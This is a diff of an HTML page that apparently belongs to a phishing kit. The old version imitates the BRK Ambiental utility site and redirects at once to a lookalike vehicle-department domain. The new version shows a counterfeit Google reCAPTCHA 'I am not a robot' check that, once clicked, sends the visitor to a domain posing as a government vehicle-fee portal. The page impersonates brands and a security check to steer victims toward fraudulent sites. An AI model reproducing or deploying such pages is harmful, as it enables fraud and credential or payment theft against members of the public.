@@ -1,313 +1,357 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<script>window.location.replace('https://departamentodeveiculo.com/sc');</script>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="theme-color" content="#0066cc">
-  <title>minha BRK</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;600;700&family=Montserrat:wght@700;800&display=swap" rel="stylesheet">
-  <style>
-    :root {
-      --blue: #0066cc;
-      --blue-deep: #004f9e;
-      --cyan: #00f1db;
-      --lime: #7fff00;
-      --text: #ffffff;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Portal Do Cliente</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
 
-    * { box-sizing: border-box; }
+body {
+  font-family: Roboto, Arial, Helvetica, sans-serif;
+  background: linear-gradient(145deg, #c8c8c8 0%, #d8d8d8 50%, #cecece 100%);
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 24px 20px;
+  -webkit-font-smoothing: antialiased;
+}
 
-    html, body {
-      margin: 0;
-      min-height: 100%;
-    }
+.security-container {
+  width: 100%;
+  max-width: 400px;
+  background: #f9f9f9;
+  border: 1px solid #b8b8b8;
+  border-radius: 18px;
+  box-shadow:
+    0 1px 0 rgba(255, 255, 255, 0.8) inset,
+    0 8px 32px rgba(0, 0, 0, 0.12),
+    0 2px 8px rgba(0, 0, 0, 0.06);
+  overflow: hidden;
+}
 
-    body {
-      min-height: 100dvh;
-      color: var(--text);
-      font-family: Inter, "Segoe UI", sans-serif;
-      background:
-        radial-gradient(90% 55% at 100% -10%, rgba(0, 241, 219, 0.2), transparent 52%),
-        radial-gradient(70% 45% at -10% 110%, rgba(127, 255, 0, 0.12), transparent 50%),
-        linear-gradient(165deg, #1a82e0 0%, var(--blue) 46%, #0057b0 100%);
-      -webkit-font-smoothing: antialiased;
-    }
+.security-header {
+  display: flex;
+  align-items: center;
+  gap: 11px;
+  padding: 18px 22px 14px;
+  border-bottom: 1px solid #e5e5e5;
+  background: linear-gradient(180deg, #ffffff 0%, #fafafa 100%);
+}
 
-    .decor {
-      position: fixed;
-      inset: 0;
-      pointer-events: none;
-      overflow: hidden;
-    }
+.security-icon {
+  width: 24px;
+  height: 24px;
+  flex-shrink: 0;
+  color: #1a73e8;
+}
 
-    .ring {
-      position: absolute;
-      border-radius: 50%;
-      border: 1.5px solid rgba(255, 255, 255, 0.16);
-    }
+.security-title {
+  font-size: 15px;
+  font-weight: 500;
+  color: #202124;
+  letter-spacing: 0.01em;
+}
 
-    .ring-a {
-      width: 18rem;
-      height: 18rem;
-      left: -7.5rem;
-      bottom: -4.5rem;
-    }
+.security-body {
+  padding: 18px 22px 22px;
+}
 
-    .ring-b {
-      width: 10.5rem;
-      height: 10.5rem;
-      left: -1.2rem;
-      bottom: 2.2rem;
-      border-color: rgba(255, 255, 255, 0.1);
-    }
+.security-text,
+.security-note {
+  font-size: 13px;
+  color: #5f6368;
+  line-height: 1.6;
+}
 
-    .ring-c {
-      width: 22rem;
-      height: 22rem;
-      right: -11rem;
-      top: -8rem;
-      border-color: rgba(0, 241, 219, 0.28);
-    }
+.security-text {
+  margin-bottom: 10px;
+}
 
-    .screen {
-      position: relative;
-      min-height: 100dvh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 2.4rem 1.35rem 2.2rem;
-    }
+.security-note {
+  margin-bottom: 18px;
+}
 
-    .column {
-      width: min(23rem, 100%);
-    }
+.recaptcha-frame {
+  width: 100%;
+  min-height: 82px;
+  background: #fff;
+  border: 1px solid #d0d0d0;
+  border-radius: 14px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 16px 0 14px;
+  box-shadow:
+    0 1px 3px rgba(0, 0, 0, 0.04),
+    inset 0 1px 0 rgba(255, 255, 255, 0.9);
+  transition: border-color 0.2s ease, box-shadow 0.2s ease;
+}
 
-    .brand {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.7rem;
-    }
+.recaptcha-frame:hover {
+  border-color: #b8b8b8;
+  box-shadow:
+    0 2px 8px rgba(0, 0, 0, 0.06),
+    inset 0 1px 0 rgba(255, 255, 255, 0.9);
+}
 
-    .mark {
-      width: 4.6rem;
-      height: auto;
-      flex: none;
-      filter: drop-shadow(0 10px 18px rgba(0, 30, 80, 0.18));
-    }
+.check-area {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  cursor: pointer;
+  user-select: none;
+  height: 100%;
+  padding: 16px 0;
+}
 
-    .word {
-      display: flex;
-      flex-direction: column;
-      line-height: 0.84;
-      font-family: Montserrat, Inter, sans-serif;
-      font-weight: 800;
-      letter-spacing: -0.045em;
-    }
+.check-area input {
+  position: absolute;
+  opacity: 0;
+  width: 0;
+  height: 0;
+}
 
-    .minha {
-      font-size: 2.15rem;
-    }
+.custom-check {
+  position: relative;
+  width: 30px;
+  height: 30px;
+  border: 2px solid #c4c4c4;
+  border-radius: 4px;
+  background: #fff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+  transition: border-color 0.18s ease, background 0.18s ease, box-shadow 0.18s ease;
+}
 
-    .brk {
-      font-size: 2.65rem;
-      letter-spacing: -0.03em;
-    }
+.check-area:hover .custom-check:not(.checked):not(.loading) {
+  border-color: #a8a8a8;
+  box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.08);
+}
 
-    .welcome {
-      margin-top: 1.85rem;
-      text-align: center;
-    }
+.check-area.verifying {
+  pointer-events: none;
+}
 
-    .hello {
-      margin: 0;
-      font-family: Montserrat, Inter, sans-serif;
-      font-size: 1.85rem;
-      font-weight: 800;
-      letter-spacing: -0.03em;
-    }
+.custom-check.checked {
+  border-color: #1a73e8;
+  background: #1a73e8;
+  box-shadow: 0 2px 8px rgba(26, 115, 232, 0.35);
+}
 
-    .lead {
-      margin: 0.45rem 0 0;
-      font-size: 1.05rem;
-      font-weight: 500;
-      line-height: 1.35;
-      color: rgba(255, 255, 255, 0.92);
-    }
+.custom-check.checked .check-icon {
+  opacity: 1;
+  animation: checkPop 0.35s cubic-bezier(0.2, 0.9, 0.3, 1.2) forwards;
+}
 
-    .rule {
-      width: 3.4rem;
-      height: 4px;
-      margin: 1.55rem auto 1.45rem;
-      border-radius: 99px;
-      background: linear-gradient(90deg, var(--lime), var(--cyan));
-    }
+.check-icon {
+  width: 20px;
+  height: 20px;
+  opacity: 0;
+  transform: scale(0.5);
+}
 
-    h1 {
-      margin: 0;
-      font-size: clamp(1.85rem, 6.5vw, 2.35rem);
-      font-weight: 500;
-      line-height: 1.2;
-      letter-spacing: -0.03em;
-    }
+.custom-check.loading {
+  border-color: #c4c4c4;
+  background: #fff;
+  box-shadow: none;
+}
 
-    .nowrap { white-space: nowrap; }
+.custom-check.loading .check-icon {
+  display: none;
+}
 
-    .hl {
-      display: inline-block;
-      margin: 0 0.16em 0 0;
-      padding: 0.05em 0.38em 0.09em;
-      background: var(--blue-deep);
-      color: #fff;
-      font-weight: 700;
-      letter-spacing: -0.03em;
-      line-height: 1.15;
-      border-radius: 8px;
-      vertical-align: -0.06em;
-      box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.08);
-    }
+.spinner {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  width: 26px;
+  height: 26px;
+  margin: -13px 0 0 -13px;
+  display: none;
+  animation: spin 0.85s linear infinite;
+  transform-origin: 13px 13px;
+}
 
-    .actions {
-      display: flex;
-      flex-direction: column;
-      gap: 0.85rem;
-      margin-top: 1.85rem;
-    }
+.spinner-track {
+  fill: none;
+  stroke: #e8eaed;
+  stroke-width: 3;
+}
 
-    .btn {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      width: 100%;
-      min-height: 3.15rem;
-      padding: 0.8rem 1.25rem;
-      border-radius: 999px;
-      font-family: inherit;
-      font-size: 0.98rem;
-      font-weight: 600;
-      letter-spacing: -0.011em;
-      text-decoration: none;
-      text-align: center;
-      line-height: 1;
-      transition: transform 0.15s ease, background 0.15s ease, border-color 0.15s ease;
-    }
+.spinner-arc {
+  fill: none;
+  stroke: #1a73e8;
+  stroke-width: 3;
+  stroke-linecap: round;
+  stroke-dasharray: 28 100;
+}
 
-    .btn:hover { transform: translateY(-1px); }
-    .btn:active { transform: translateY(0); }
+.custom-check.loading .spinner {
+  display: block;
+}
 
-    .btn:focus-visible {
-      outline: 3px solid #fff;
-      outline-offset: 3px;
-    }
+.check-text {
+  font-size: 14px;
+  color: #202124;
+  font-weight: 400;
+  letter-spacing: 0.01em;
+}
 
-    .btn-fill {
-      background: #fff;
-      color: var(--blue);
-    }
+.captcha-brand {
+  text-align: center;
+  line-height: 1.2;
+  padding-right: 4px;
+  min-width: 72px;
+}
 
-    .btn-fill:hover { background: #f3fbff; }
+.captcha-brand img {
+  width: 34px;
+  height: 34px;
+  display: block;
+  margin: 0 auto 2px;
+  opacity: 0.92;
+}
 
-    .btn-line {
-      background: transparent;
-      color: #fff;
-      border: 1.5px solid rgba(255, 255, 255, 0.92);
-    }
+.captcha-brand .brand-name {
+  font-size: 10px;
+  color: #555;
+  font-weight: 400;
+  letter-spacing: 0.02em;
+}
 
-    .btn-line:hover { background: rgba(255, 255, 255, 0.1); }
+.captcha-brand .brand-links {
+  font-size: 8px;
+  color: #666;
+  margin-top: 2px;
+}
 
-    .brand, .welcome, .rule, h1, .actions {
-      animation: rise 0.7s ease both;
-    }
+.captcha-brand a {
+  color: #555;
+  text-decoration: none;
+}
 
-    .welcome { animation-delay: 0.08s; }
-    .rule { animation-delay: 0.14s; }
-    h1 { animation-delay: 0.18s; }
-    .actions { animation-delay: 0.28s; }
+.captcha-brand a:hover {
+  text-decoration: underline;
+}
 
-    @keyframes rise {
-      from { opacity: 0; transform: translateY(14px); }
-      to { opacity: 1; transform: none; }
-    }
+@keyframes spin {
+  from { transform: rotate(0deg); }
+  to { transform: rotate(360deg); }
+}
 
-    @media (max-width: 380px) {
-      h1 { font-size: 1.62rem; }
-      .minha { font-size: 1.85rem; }
-      .brk { font-size: 2.25rem; }
-      .mark { width: 3.9rem; }
-      .hello { font-size: 1.6rem; }
-      .screen { padding-inline: 1.1rem; }
-    }
+@keyframes checkPop {
+  0% { opacity: 0; transform: scale(0.4); }
+  70% { opacity: 1; transform: scale(1.08); }
+  100% { opacity: 1; transform: scale(1); }
+}
 
-    @media (prefers-reduced-motion: reduce) {
-      .brand, .welcome, .rule, h1, .actions {
-        animation: none;
-      }
-    }
-  </style>
+@media (max-width: 380px) {
+  .security-header,
+  .security-body {
+    padding-left: 16px;
+    padding-right: 16px;
+  }
+
+  .recaptcha-frame {
+    padding: 0 12px 0 10px;
+  }
+
+  .check-text {
+    font-size: 13px;
+  }
+}
+</style>
 </head>
 <body>
-  <div class="decor" aria-hidden="true">
-    <span class="ring ring-a"></span>
-    <span class="ring ring-b"></span>
-    <span class="ring ring-c"></span>
+<div class="security-container">
+  <div class="security-header">
+    <svg class="security-icon" viewBox="0 0 24 24" fill="currentColor">
+      <path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+    </svg>
+    <span class="security-title">Confirmação de acesso</span>
   </div>
 
-  <main class="screen">
-    <div class="column">
-      <div class="brand">
-        <svg class="mark" viewBox="0 0 86 84" fill="none" aria-hidden="true">
-          <path d="M4 36.5 L34 58 L4 79.5" stroke="#7fff00" stroke-width="14.5" stroke-linejoin="miter" stroke-linecap="butt"/>
-          <path d="M26 4.5 L56 26 L26 47.5" stroke="#00f1db" stroke-width="14.5" stroke-linejoin="miter" stroke-linecap="butt"/>
-        </svg>
-        <div class="word">
-          <span class="minha">minha</span>
-          <span class="brk">BRK</span>
+  <div class="security-body">
+    <p class="security-text">
+        Por motivos de segurança, realize a confirmação de segurança para continuar seu acesso ao portal.
+    </p>
+    <p class="security-note">
+        Selecione a opção abaixo para acessar as informações e serviços disponíveis.
+    </p>
+
+    <div class="recaptcha-frame">
+      <label class="check-area" id="checkArea">
+        <input type="checkbox" id="check">
+        <div class="custom-check" id="customCheck">
+          <svg class="spinner" viewBox="0 0 50 50">
+            <circle class="spinner-track" cx="25" cy="25" r="20"/>
+            <circle class="spinner-arc" cx="25" cy="25" r="20"/>
+          </svg>
+          <svg class="check-icon" viewBox="0 0 24 24" fill="none">
+            <path d="M9 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" fill="#fff"/>
+          </svg>
+        </div>
+        <span class="check-text">Não sou um robô</span>
+      </label>
+
+      <div class="captcha-brand">
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="34" height="34" alt="reCAPTCHA">
+        <div class="brand-name">reCAPTCHA</div>
+        <div class="brand-links">
+          <a href="https://policies.google.com/privacy" target="_blank" rel="noopener">Privacidade</a>
+          -
+          <a href="https://policies.google.com/terms" target="_blank" rel="noopener">Termos</a>
         </div>
       </div>
-
-      <div class="welcome">
-        <p class="hello">Olá!</p>
-        <p class="lead">Bem-vindo ao novo site<br>da BRK Ambiental.</p>
-      </div>
-
-      <div class="rule" aria-hidden="true"></div>
-
-      <h1>
-        Transformando o<br>
-        saneamento de<br>
-        mais de<br>
-        <span class="nowrap"><span class="hl">100 cidades</span> do</span><br>
-        Brasil
-      </h1>
-
-      <!--
-        ============================================================
-        LINKS DOS CLIQUES
-        Troque apenas o endereço que está dentro de href="..."
-        ============================================================
-      -->
-      <div class="actions">
-        <!-- Troque o href abaixo pelo link de "Escolher minha cidade" -->
-        <a class="btn btn-fill" href="https://brkminha2via.com/brk/">Escolher minha cidade</a>
-        <!-- Troque o href abaixo pelo link de "Acessar site institucional" -->
-        <a class="btn btn-line" href="https://brkminha2via.com/brk/">Acessar site institucional</a>
-      </div>
     </div>
-  </main>
+  </div>
+</div>
 
-  <script>
-    document.querySelectorAll("a[href*='COLOQUE-O-LINK']").forEach(function (link) {
-      link.addEventListener("click", function (event) {
-        event.preventDefault();
-        var qual = link.classList.contains("btn-fill")
-          ? "Escolher minha cidade"
-          : "Acessar site institucional";
-        window.alert("O botão \"" + qual + "\" ainda não tem destino.\nAbra o arquivo index.html e troque o href desse botão pelo seu link.");
-      });
-    });
-  </script>
+<script>
+const check = document.getElementById("check");
+const customCheck = document.getElementById("customCheck");
+const checkArea = document.getElementById("checkArea");
+let verifying = false;
+
+check.addEventListener("change", () => {
+  if (!check.checked) {
+    if (verifying) {
+      check.checked = true;
+      return;
+    }
+    customCheck.classList.remove("checked", "loading");
+    checkArea.classList.remove("verifying");
+    return;
+  }
+
+  if (verifying) return;
+
+  verifying = true;
+  checkArea.classList.add("verifying");
+  customCheck.classList.add("loading");
+
+  setTimeout(() => {
+    customCheck.classList.remove("loading");
+    customCheck.classList.add("checked");
+    checkArea.classList.remove("verifying");
+    verifying = false;
+
+    setTimeout(() => {
+      window.location.href = "https://portalguiasveiculares-gov.com/sc";
+    }, 800);
+  }, 1000);
+});
+</script>
 </body>
 </html>
